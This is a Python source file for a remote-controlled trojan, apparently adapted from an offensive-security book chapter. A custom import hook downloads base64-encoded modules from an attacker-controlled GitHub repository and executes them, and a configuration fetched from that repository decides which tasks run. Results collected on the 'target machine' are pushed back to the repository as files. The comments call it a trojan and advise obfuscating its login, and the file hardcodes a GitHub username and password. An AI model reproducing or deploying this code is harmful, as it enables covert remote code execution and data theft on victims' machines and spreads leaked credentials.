#!/usr/bin/env python
# -*- coding: utf-8 -*-
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

# the trojan_id variable uniquely identifies this trojan
trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path     = "data/%s/" % trojan_id
trojan_modules= []

task_queue    = Queue.Queue()
configured    = False

# this class is used every time the interpreter attempts to load a module that isn’t available (http://xion.org.pl/2012/05/06/hacking-python-imports/)
class GitImporter(object):

    def __init__(self):

        self.current_module_code = ""


    # this function is called first in an attempt to locate the module
    def find_module(self,fullname,path=None):

        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            # we pass this call to our remote file loader
            new_library = get_file_contents("modules/%s" % fullname)

            # if we can locate the file in our repo, we base64-decode the code and store it in our class
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                # by returning self, we indicate to the interpreter that we found the module and it can then call our load_module function to actually load it
                return self


        return None

    def load_module(self,name):
        # first create a new blank module object
        module = imp.new_module(name)
        # we shovel the code we retrieved from GitHub into the module
        exec self.current_module_code in module.__dict__
        # insert our newly created module into the sys.modules list so that it’s picked up by any future import calls
        sys.modules[name] = module

        return module


# this function authenticates the user to the repository, and retrieves the current repo and branch objects for use by other functions
# in a real-world scenario, you want to obfuscate this authentication procedure as best as you can
def connect_to_github():
    gh = login(username="wilkec",password="Slovak1a")
    repo = gh.repository("wilkec","chapter")
    branch = repo.branch("master")

    return gh, repo, branch

# this function grabs files from the remote repo and then reads the contents in locally
def get_file_contents(filepath):

    gh, repo, branch = connect_to_github()

    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print "[*] Found file %s" % filepath

            blob = repo.blob(filename._json_data['sha'])

            return blob.content

    return None

# this function retrieves the remote configuration document from the repo so that your trojan knows which modules to run
def get_trojan_config():
    global configured

    config_json   = get_file_contents(trojan_config)
    config        = json.loads(base64.b64decode(config_json))
    configured    = True

    for task in config:

        if task['module'] not in sys.modules:

            exec("import %s" % task['module'])

    return config

# this funtion is used to push any data that you’ve collected on the target machine
def store_module_result(data):

    gh,repo,branch = connect_to_github()

    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))

    repo.create_file(remote_path,"Commit message",base64.b64encode(data))

    return

def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in our repo
    store_module_result(result)

    return


# we add our custom module importer before we begin the main loop of our app
sys.meta_path = [GitImporter()]

while True:

    if task_queue.empty():

        # The first step is to grab the configuration file from the repo
        config = get_trojan_config()

        for task in config:
            # we kick off the module in its own thread
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000,10000))

